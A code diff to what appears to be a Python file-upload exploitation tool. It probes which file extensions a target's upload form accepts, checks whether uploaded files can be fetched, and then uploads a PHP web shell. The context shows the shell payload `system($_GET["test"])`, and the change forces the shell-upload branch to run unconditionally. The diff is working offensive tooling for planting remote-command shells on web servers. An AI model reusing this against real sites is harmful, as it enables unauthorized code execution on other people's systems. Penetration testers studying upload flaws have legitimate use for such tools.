@@ -226,14 +226,20 @@ def parse_request_file(request_file):
     return content, headers, host, path
 
 def test_accepted_formats(request_file, session, extensions_array):
+    content, headers, host, path = parse_request_file(options.request_file)
+    upload_url = f"http://{host}{options.upload_dir}"
+    
     accepted_extensions = list()
     for extension in extensions_array:
         with open(f"assets/sample_files/sample.{extension}", 'rb') as file: file_data = file.read()
         file_name = generate_random_string(10) + f".{extension}"
         response, session, headers, url, file_name = upload(request_file, session, file_data, file_name, config.mimetypes[extension])
         if (check_success(response)):
-            success(f"Filetype {extension} is accepted")
-            accepted_extensions.append(extension)
+            if (check_if_uploaded(file_name)):
+                success(f"Filetype {extension} is accepted")
+                accepted_extensions.append(extension)
+            else:
+                warning(f"Filetype {extension} is accepted, but not file not accessible")
         else:
             failure(f"Filetype {extension} is not accepted")
 
@@ -260,6 +266,21 @@ def check_shell(url, more_info=False):
         if (more_info):
             if ('<?php system($_GET["test"]); ?>' in response.text):
                 return "printed_out"
+        return False
+
+def check_if_uploaded(file_name):
+    content, headers, host, path = parse_request_file(options.request_file)
+    upload_url = f"http://{host}{options.upload_dir}"
+
+    response = GET(upload_url + file_name)
+    print(upload_url + file_name)
+
+    if (response.status_code == 200):
+        return True
+
+    if (response.status_code != config.baseline_response.status_code):
+        return True
+    else:
         return False
 
 def upload(request_file, session, file_data, file_name, file_content_type, timeout=20):
@@ -399,6 +420,11 @@ def main():
     content, headers, host, path = parse_request_file(options.request_file)
     upload_url = f"http://{host}{options.upload_dir}"
 
+    #Get baseline 404 response
+    config.baseline_response = GET(upload_url + generate_random_string(10) + "_nonexistent_file.zip")
+    if (config.baseline_response.status_code == 200):
+        warning("Non-existent paths respond with code 200, this might impact the results")
+
     if (options.accepted_extensions != False): 
         accepted_extensions = options.accepted_extensions.split(",")
     else:
@@ -410,12 +436,12 @@ def main():
         debug(accepted_extensions, 3)
 
         accepted_php_extensions = test_accepted_formats(options.request_file, session, config.extensions["php"])
-        debug(accepted_extensions, 3)
+        debug(accepted_extensions, 3) 
 
         if (len(accepted_extensions) < 1 and len(accepted_php_extensions) < 1):
             error("No accepted extensions found")
 
-        if (len(accepted_php_extensions) > 0):
+        if (True):
             for accepted_php_extension in accepted_php_extensions:
                 info(f"Trying to upload .{accepted_php_extension} shell...")
                 with open(config.shell_path, 'rb') as file: file_data = file.read()
